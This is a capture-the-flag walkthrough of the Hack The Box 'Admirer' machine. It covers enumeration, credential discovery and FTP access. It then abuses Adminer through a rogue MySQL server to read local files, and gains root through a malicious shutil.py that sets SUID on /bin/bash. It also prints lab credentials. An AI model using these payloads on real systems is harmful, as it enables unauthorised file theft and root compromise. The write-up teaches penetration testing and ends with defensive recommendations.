# HTB - Admirer

**IP Address:** `10.10.10.187`  
**OS:** Linux  
**Difficulty:** Easy  
**Tags:** #FTP, #Adminer, #WebFuzzing, #DatabaseExploitation, #PythonHijack

---
## Synopsis

Admirer is an easy Linux machine that highlights the risks of weak web directory security and insecure database management tools.  
The exploitation path involves fuzzing hidden directories, extracting credentials from web-exposed files, leveraging a vulnerable Adminer instance to gain database access, and finally escalating privileges by abusing Python library hijacking in backup scripts.

---
## Skills Required

- Basic web enumeration and fuzzing techniques  
- Understanding of FTP and SQL basics  
- Familiarity with Linux privilege escalation methods  

## Skills Learned

- Directory brute-forcing with wordlists  
- Extracting sensitive credentials from misconfigured files  
- Exploiting **Adminer** database misconfigurations  
- Leveraging **Python library hijacking** for privilege escalation  

---
## 1. Initial Enumeration

### 1.1 Connectivity Test

Verify if the host is alive using ICMP:

```bash
ping -c 1 10.10.10.187
```

![Ping](GitHubv2/HackTheBox/EASY/Admirer/screenshots/ping.png)

The host responds, confirming it is reachable.

---
### 1.2 Port Scanning

We begin by scanning all 65,535 TCP ports to identify exposed services:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.187 -oG allPorts
```

- `-p-`: Scan all 65,535 ports  
- `--open`: Show only open ports  
- `-sS`: SYN scan  
- `--min-rate 5000`: Increase speed  
- `-Pn`: Skip host discovery (already confirmed alive)  
- `-oG`: Output in grepable format

![All Ports Scan](GitHubv2/HackTheBox/EASY/Admirer/screenshots/allports.png)

Extract open ports from the result:

```bash
extractPorts allPorts
```

![Extract Ports](GitHubv2/HackTheBox/EASY/Admirer/screenshots/extractports.png)

---
### 1.3 Targeted Scan

Run a deeper scan with service/version detection and default scripts:

```bash
nmap -sCV -p21,22,80 10.10.10.187 -oN targeted
```

- `-sC`: Run default NSE scripts  
- `-sV`: Detect service versions  
- `-oN`: Output in human-readable format  

Let's check the result:

```bash
cat targeted -l java
```

![Targeted Scan](GitHubv2/HackTheBox/EASY/Admirer/screenshots/targeted.png)

| Port | Service | Version / Description                         |
| ---- | ------- | --------------------------------------------- |
| 21   | FTP     | vsftpd 3.0.3                                  |
| 22   | SSH     | OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0) |
| 80   | HTTP    | Apache httpd 2.4.25 (Debian)                  |

Running CrackMapExec confirms this is **not a Domain Controller**:

![CrackMapExec](GitHubv2/HackTheBox/EASY/Admirer/screenshots/crackmapexec.png)

We confirm that the target is a Linux host.

---
## 2. Web Enumeration

Accessing the web service at `http://10.10.10.187` shows a basic webpage:

![Website Home](GitHubv2/HackTheBox/EASY/Admirer/screenshots/web.png)

The page is static with only one input field. After initial testing, no interaction was possible.  
At this point, **fuzzing** becomes the best approach.

### 2.1 Directory Fuzzing

We run `wfuzz` against the target:

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.187/FUZZ
```

![Wfuzz F results](GitHubv2/HackTheBox/EASY/Admirer/screenshots/wfuzz_F.png)

Nothing relevant is found.  
However, from the **Nmap scan** we noticed the `/admin-dir/` folder. Let's refine the fuzzing by targeting extensions:

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,php-html-txt http://10.10.10.187/admin-dir/FUZZ.FUZ2Z
```

![Wfuzz contact.txt](GitHubv2/HackTheBox/EASY/Admirer/screenshots/wfuzz_contact.png)

We discover `contacts.txt`:

```bash
http://10.10.10.187/admin-dir/contacts.txt
```

![Contacts.txt](GitHubv2/HackTheBox/EASY/Admirer/screenshots/web_contact.png)

This file contains **emails of employees**, which may be used later.

### 2.2 Focused Wordlist Fuzzing

To improve results, we create a custom dictionary with keywords like `user`, `pass`, `cred`, `config`, etc.:

```bash
grep -iE "user|name|pass|key|cred|secret|mail|database|db|config" /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt > ../content/dictionary
```

![Dictionary creation](GitHubv2/HackTheBox/EASY/Admirer/screenshots/dictionary.png)

Then rerun fuzzing:

```bash
wfuzz -c --hc=404 -t 200 -w /home/kali/Documents/Machines/Admirer/content/dictionary http://10.10.10.187/admin-dir/FUZZ.txt
```

![Wfuzz credentials.txt](GitHubv2/HackTheBox/EASY/Admirer/screenshots/wfuzz_credentials.png)

This reveals a **credentials.txt** file:

![Credentials.txt](GitHubv2/HackTheBox/EASY/Admirer/screenshots/web_credentials.png)

The credentials allow FTP access.

---
## 3. Foothold

### 3.1 FTP Access

Using the discovered credentials, we connect to FTP and download available files:

![FTP login](GitHubv2/HackTheBox/EASY/Admirer/screenshots/ftp_ftpuser.png)

Inside we find `dump.sql` that is a database dump generated with `mysqldump`, containing the structure and data of the application.  
It often includes sensitive information such as users, passwords, or critical configurations.:

![dump.sql](GitHubv2/HackTheBox/EASY/Admirer/screenshots/dump_sql.png)

No useful credentials here. Extracting files from the second archive reveals more data, including a script in **utility-scripts** directory with credentials:

![Database Admin credentials](GitHubv2/HackTheBox/EASY/Admirer/screenshots/db_admin.png)

Discovered credentials:  
`waldo : Wh3r3_1s_w4ld0?`

### 3.2 Web Information Disclosure

Accessing `info.php` provides **PHP configuration details**:

![phpinfo()](GitHubv2/HackTheBox/EASY/Admirer/screenshots/web_info_php.png)

![Disabled PHP functions](GitHubv2/HackTheBox/EASY/Admirer/screenshots/web_info_disabled_functions.png)

The most interesting part of `disable_functions` is that it shows which critical PHP functions are blocked.  
If `system`, `exec`, `shell_exec` or similar are not listed, we can use them to execute system commands.  
In a CTF or pentest, this determines whether we can spawn a shell directly or need to find alternatives.

Will be useful later for exploitation.

### 3.3 Exploiting Adminer

Fuzzing also revealed `adminer.php`, a **database management tool**:

![Adminer login page](GitHubv2/HackTheBox/EASY/Admirer/screenshots/web_adminer.png)

Research shows this version is vulnerable ([Foregenix Blog](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool)).  
The attack allows connecting Adminer to our **attacker-controlled MySQL server**.

We create a local database and user:

```bash
sudo systemctl start mariadb
sudo mysql -uroot
create database Pwned;
use Pwned;
create user 'kali'@'10.10.10.187' identified by 'kali123';
GRANT ALL on Pwned.* to 'kali'@'10.10.10.187';
create table data(output varchar(1024));
show tables;
describe data;
```

![MariaDB database creation](GitHubv2/HackTheBox/EASY/Admirer/screenshots/mariadb_creation.png)
![MariaDB table creation](GitHubv2/HackTheBox/EASY/Admirer/screenshots/mariadb_table_data.png)

Using Adminer, we execute SQL commands against our database:

![Adminer login](GitHubv2/HackTheBox/EASY/Admirer/screenshots/login_adminer.png)

Go to SQL Command section:

![Adminer SQL command](GitHubv2/HackTheBox/EASY/Admirer/screenshots/adminer_sql_command.png)

And write the command:

```bash
load data local infile "/var/www/html/index.php"
into table Pwned.data
```

![Adminer SQL executed](GitHubv2/HackTheBox/EASY/Admirer/screenshots/adminer_sql_command_execued.png)

And now let’s check the data of the table:

```bash
select output from data;
```

![Select output from data](GitHubv2/HackTheBox/EASY/Admirer/screenshots/select_output_from_data.png)

We extract new credentials from the table.

Let’s try the credentials on SSH as `waldo`:

![User flag](GitHubv2/HackTheBox/EASY/Admirer/screenshots/user_flag.png)

🏁 **User flag obtained**

---
## 4. Privilege Escalation

### 4.1 Backup Scripts

While enumerating, we discover that the script `/opt/scripts/admin_tasks.sh` can be executed by all users:

![Admin tasks script](GitHubv2/HackTheBox/EASY/Admirer/screenshots/setenv_admin_tasks.png)

``` bash
#!/bin/bash

view_uptime()
{
    /usr/bin/uptime -p
}

view_users()
{
    /usr/bin/w
}

view_crontab()
{
    /usr/bin/crontab -l
}

backup_passwd()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/passwd to /var/backups/passwd.bak..."
        /bin/cp /etc/passwd /var/backups/passwd.bak
        /bin/chown root:root /var/backups/passwd.bak
        /bin/chmod 600 /var/backups/passwd.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_shadow()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/shadow to /var/backups/shadow.bak..."
        /bin/cp /etc/shadow /var/backups/shadow.bak
        /bin/chown root:shadow /var/backups/shadow.bak
        /bin/chmod 600 /var/backups/shadow.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_db()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running mysqldump in the background, it may take a while..."
        #/usr/bin/mysqldump -u root admirerdb > /srv/ftp/dump.sql &
        /usr/bin/mysqldump -u root admirerdb > /var/backups/dump.sql &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

# Non-interactive way, to be used by the web interface
if [ $# -eq 1 ]
then
    option=$1
    case $option in
        1) view_uptime ;;
        2) view_users ;;
        3) view_crontab ;;
        4) backup_passwd ;;
        5) backup_shadow ;;
        6) backup_web ;;
        7) backup_db ;;

        *) echo "Unknown option." >&2
    esac

    exit 0
fi

# Interactive way, to be called from the command line
options=("View system uptime"
         "View logged in users"
         "View crontab"
         "Backup passwd file"
         "Backup shadow file"
         "Backup web data"
         "Backup DB"
         "Quit")

echo
echo "[[[ System Administration Menu ]]]"
PS3="Choose an option: "
COLUMNS=11
select opt in "${options[@]}"; do
    case $REPLY in
        1) view_uptime ; break ;;
        2) view_users ; break ;;
        3) view_crontab ; break ;;
        4) backup_passwd ; break ;;
        5) backup_shadow ; break ;;
        6) backup_web ; break ;;
        7) backup_db ; break ;;
        8) echo "Bye!" ; break ;;

        *) echo "Unknown option." >&2
    esac
done
```

The script internally calls `backup.py`, let´s see the code:

![Backup.py content](GitHubv2/HackTheBox/EASY/Admirer/screenshots/cat_backup.png)

Inspecting `backup.py`, we see it imports the **`shutil`** library and uses the function `make_archive` so this opens the possibility of **Python library hijacking**.

### 4.2 Python Library Hijacking

We create a malicious `shutil.py`:

```python
import os
os.system("chmod u+s /bin/bash") 
```

Place it in `/tmp`, then execute the vulnerable backup process.  
Now `/bin/bash` has the SUID bit set:

```bash
ls -l /bin/bash
```

![Root permissions on bash](GitHubv2/HackTheBox/EASY/Admirer/screenshots/root_permissions.png)

Spawn a root shell:

```bash
bash -p
whoami
cd /root/
cat root.txt
```

![Root flag](GitHubv2/HackTheBox/EASY/Admirer/screenshots/root_flag.png)

🏁 **Root flag obtained**

---
# ✅ MACHINE COMPLETE

---
## Summary of Exploitation Path

1. **Directory Fuzzing** → Discovered sensitive files (`contacts.txt`, `credentials.txt`).  
2. **FTP Access** → Retrieved internal files and database credentials.  
3. **Adminer Exploitation** → Used a misconfiguration to extract further credentials.  
4. **SSH Access** → Logged in as `waldo`.  
5. **Python Hijack** → Escalated to root via malicious `shutil.py`.  

---
## Defensive Recommendations

- Restrict access to sensitive web directories.  
- Do not store plaintext credentials in web-exposed files.  
- Update or disable vulnerable tools like **Adminer**.  
- Run periodic audits for unnecessary scripts in `/opt`.  
- Enforce least privilege and disable SUID where not required.  
